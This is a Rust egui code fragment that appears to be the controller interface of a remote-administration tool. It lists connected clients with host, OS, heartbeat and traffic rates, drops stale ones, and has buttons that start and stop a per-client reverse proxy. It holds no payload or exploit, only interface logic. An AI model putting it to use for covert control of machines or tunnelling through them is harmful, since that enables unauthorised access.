                        row.col(|ui| {
                            ui.label(info.info.host_name);
                        })
                        .context_menu(menu);
                        row.col(|ui| {
                            ui.label(info.info.os);
                        })
                        .context_menu(menu);
                        row.col(|ui| {
                            ui.label(format!("{:?}", info.proto));
                        })
                        .context_menu(menu);

                        row.col(|ui| {
                            let secs = cur_timestamp_secs() - info.last_heartbeat;
                            let in_rate = info.in_rate / (secs + HEART_BEAT_TIME);
                            ui.label(transfer_speed(in_rate as f64));
                        })
                        .context_menu(menu);

                        row.col(|ui| {
                            let secs = cur_timestamp_secs() - info.last_heartbeat;
                            let out_rate = info.out_rate / (secs + HEART_BEAT_TIME);
                            ui.label(transfer_speed(out_rate as f64));
                        })
                        .context_menu(menu);

                        row.col(|ui| {
                            let secs = cur_timestamp_secs() - info.last_heartbeat;
                            if secs > 30 {
                                remove_host(info.clientid);
                            }
                            ui.label(format!("{} s", secs));
                        })
                        .context_menu(menu);
                        row.col(|ui| {
                            ui.label(info.info.remark);
                        })
                        .context_menu(menu);
                         row.col(|ui| {
                        ui.add_space(10.0);
                        if ui.button("Start").clicked() {
                            let stop_tx = STOP_TX.clone();
                            let stop_rx = STOP_RX.clone();
                            self.proxy_running.insert(clientid.clone(), true);  
                      
                            let clientid = clientid.clone(); 

                            thread::spawn(move || {
                                println!("xxx th33333 runned");
                        
                                // Create a tokio runtime to run async code
                               
                                // Use the runtime to execute async code inside the thread
                            
                                    start_rprox(&clientid, true, stop_rx);
                              
                                println!("xxx th33331 runed");
                            });
                             
                           
            
                            // match start_rprox(&clientid, true,stop_rx) {
                            //     Ok(_) => {}
                            //     Err(e) => {
                            //         msgbox::error(&"REVERSE PROXY".to_string(), &format!("{}", e));
                            //     }
                            // };
                            ui.close_menu();
                        }
                        if ui.button("Stop").clicked() {
                         
                            self.proxy_running.insert(clientid.clone(), false); 
                            
                            match stop_rprox(&clientid) {
                                Ok(_) => {}
                                Err(e) => {
                                    msgbox::error(&"REVERSE PROXY".to_string(), &format!("{}", e));
                                }
                            };
                            ui.close_menu();
                        
                           
                        }

                       
                        let color = if *self.proxy_running.get(&clientid).unwrap_or(&false) {
                            egui::Color32::GREEN
                        } else {
                            egui::Color32::RED
                        };

                        let size = egui::Vec2::splat(10.0);
                        let rect = ui.available_rect_before_wrap();
                        let center = rect.center();
                        ui.painter().circle(
                            center,
                            size.x / 2.0,
                            color,
                            egui::Stroke::new(1.0, egui::Color32::BLACK),
                        );
                    });
                });
            }
        });
    }
    fn add_user(&mut self, clientid: String) {
        self.proxy_running.insert(clientid, false);
    }
}
